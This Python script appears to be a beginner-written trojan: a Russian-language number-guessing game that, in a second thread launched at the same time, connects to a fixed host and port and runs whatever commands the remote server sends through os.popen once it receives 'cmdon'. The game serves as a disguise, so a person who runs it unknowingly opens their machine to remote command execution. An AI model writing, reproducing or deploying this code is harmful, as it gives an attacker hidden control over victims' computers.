import random
import socket
from threading import Thread
import os

def game():
    number = random.randint(0,1000)
    tries = 1
    done = True
    while done:
        while True:
            try:
                guess = int(input('введите число: '))
                if guess <= 1000 and guess >= 1:
                    break
                else:
                    print('Введите число от 1 до 1000')
            except ValueError:
                print('Пожалуйста введите число!')
        if guess == number:
            done = False
            print(f'Ты победил! Я загадал {guess}. Ты использовал {tries} попыток.')
        else:
            tries += 1
            if guess > number:
                print('Загаданноче число меньше!')
            else:
                print('Загаданное число больше!')

def trojan():
    HOST = '192.168.1.13'
    PORT = 9090

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))
    cmd_mode = False
    while True:
        server_command = client.recv(1024).decode('cp866')
        if server_command == 'cmdon':
            cmd_mode = True
            client.send('Получен доступ к терминалу'.encode('cp866'))
            continue
        if server_command == 'cmdoff':
            cmd_mode = False
        if cmd_mode == True:
            os.popen(server_command)
        else:
            if server_command == 'hello':
                print('Hello World!')
        client.send(f'{server_command} успешно отправлена!'.encode('cp866'))
tread1 = Thread(target = game)
tread2 = Thread(target = trojan)
tread1.start()
tread2.start()
